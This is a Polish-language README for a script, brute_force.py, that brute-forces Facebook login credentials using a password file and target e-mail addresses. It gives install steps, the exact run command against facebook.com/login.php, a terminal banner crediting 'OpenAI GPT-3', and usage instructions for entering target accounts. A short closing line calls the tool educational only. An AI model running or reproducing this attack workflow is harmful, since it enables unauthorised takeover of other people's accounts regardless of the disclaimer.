### Opis programu: trzeba często reinstalować program 

Program jest narzędziem do przeprowadzania ataku brute force na strony logowania Facebooka. Wykorzystuje listę haseł z pliku tekstowego do prób logowania dla podanych adresów e-mail. W przypadku poprawnego odgadnięcia kombinacji e-mail/hasło, program kończy działanie, wypisując odnalezione dane logowania.

comand :
(rootkali)-[~/Facebook-brute-force-]
# touch passwords.txt
(rootkali)-[~/Facebook-brute-force-]
# python3 brute_force.py http://facebook.com/login.php passwords.txt Email@gmail.com
 __      __                        .___
/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______
\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/
 \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \
  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >
       \/                           \/  |__|                   \/       \/       \/

        \ /       _  _  __    _  _    ___ __    __ _  _  __ __
         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_
        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\__|__


+ -- --=[Facebook Brute Force Exploit by OpenAI GPT-3
+ -- --=[Brute forcing target: http://facebook.com/login.php with emails: ['**************???']
Enter email address (as username): Email *****
Enter Facebook ID:




### Wymagania:

1. Python 3.x
2. Moduły Python: `requests` i `bs4` (Beautiful Soup)

### Instalacja:

1. **Zainstaluj Pythona 3.x:**
   - Pobierz i zainstaluj Pythona ze strony: [Python Downloads](https://www.python.org/downloads/)

2. **Zainstaluj niezbędne moduły:**
   - Otwórz terminal i użyj poniższych komend:

```bash
pip3 install requests
pip3 install beautifulsoup4
```

### Użycie:

1. **Pobierz kod źródłowy:**
   - Możesz skopiować kod źródłowy z poprzednich wiadomości lub pobrać cały projekt z repozytorium.

2. **Uruchom program:**
   - W terminalu przejdź do katalogu z programem:
     ```bash
     cd Ścieżka/do/Facebook-brute-force
     ```
   - Uruchom program za pomocą Pythona 3:
     ```bash
     python3 brute_force.py
     ```

3. **Podaj dane do ataku:**
   - Wprowadź adresy e-mail do przeprowadzenia ataku oraz ścieżkę do pliku z hasłami, gdy zostaniesz o to poproszony.

4. **Obserwuj wyniki:**
   - Program będzie próbował logować się, wyświetlając wyniki w konsoli.
   - Po odnalezieniu poprawnej kombinacji e-mail/hasło, program zakończy działanie.

**Uwaga:** Pamiętaj, że korzystanie z takich narzędzi do ataków na strony logowania jest nielegalne, jeśli nie masz zgody właściciela strony. Ten kod jest jedynie edukacyjny i powinien być używany wyłącznie w celach edukacyjnych i etycznych.